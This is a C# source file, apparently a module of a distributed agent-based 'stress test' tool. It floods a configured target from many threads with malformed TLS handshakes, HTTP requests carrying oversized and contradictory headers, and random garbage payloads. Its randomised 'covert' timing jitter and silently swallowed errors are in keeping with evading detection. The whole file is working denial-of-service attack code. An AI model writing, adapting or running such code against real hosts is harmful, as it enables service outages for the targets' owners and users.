using System.Net.Sockets;
using System.Text;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Agent.Modules.StressTest;

public class MalformedPacket : IStressMethod
{
    public string Name => "Malformed Protocol Packets";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var tasks = new List<Task>();
        var threads = Math.Min(config.ThreadsPerAgent / 10, 50);
        for (int i = 0; i < threads; i++)
        {
            var idx = i % 3;
            if (idx == 0) tasks.Add(MalTlsLoop(config, rpt, ct));
            else if (idx == 1) tasks.Add(MalHttpLoop(config, rpt, ct));
            else tasks.Add(SynPayloadLoop(config, rpt, ct));
        }
        await Task.WhenAll(tasks);
    }

    private async Task MalTlsLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                using var client = new TcpClient();
                await client.ConnectAsync(config.TargetHost, config.TargetPort, ct);
                var stream = client.GetStream();
                var tls = BuildMalformedTls();
                await stream.WriteAsync(tls, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(tls.Length);
                await Task.Delay(CovertUtils.RandomJitter(100, 0.5), ct);
            }
            catch { }
        }
    }

    private async Task MalHttpLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                using var client = new TcpClient();
                await client.ConnectAsync(config.TargetHost, config.TargetPort, ct);
                var data = Encoding.ASCII.GetBytes(
                    $"GET {config.HttpPath} HTTP/1.1\r\n" +
                    $"Host: {config.TargetHost}\r\n" +
                    $"X-Oversized: {new string('X', 8192)}\r\n" +
                    $"Transfer-Encoding: chunked, identity, gzip\r\n" +
                    $"Content-Length: -1\r\n\r\n");
                await client.GetStream().WriteAsync(data, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(data.Length);
                await Task.Delay(CovertUtils.RandomJitter(50, 0.5), ct);
            }
            catch { }
        }
    }

    private async Task SynPayloadLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                using var client = new TcpClient();
                await client.ConnectAsync(config.TargetHost, config.TargetPort, ct);
                var garbage = CovertUtils.RandomPayload(256, 4096);
                await client.Client.SendAsync(garbage, SocketFlags.None, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(garbage.Length);
                await Task.Delay(CovertUtils.RandomJitter(100, 0.5), ct);
            }
            catch { }
        }
    }

    private static byte[] BuildMalformedTls()
    {
        var rand = new Random();
        var len = 256 + rand.Next(0, 512);
        var buf = new byte[len];
        buf[0] = 0x16; buf[1] = 0x03; buf[2] = (byte)rand.Next(1, 4);
        buf[3] = (byte)((len - 5) >> 8); buf[4] = (byte)(len - 5);
        buf[5] = 0x01;
        for (int i = 6; i < len; i++) buf[i] = (byte)rand.Next(256);
        return buf;
    }
}
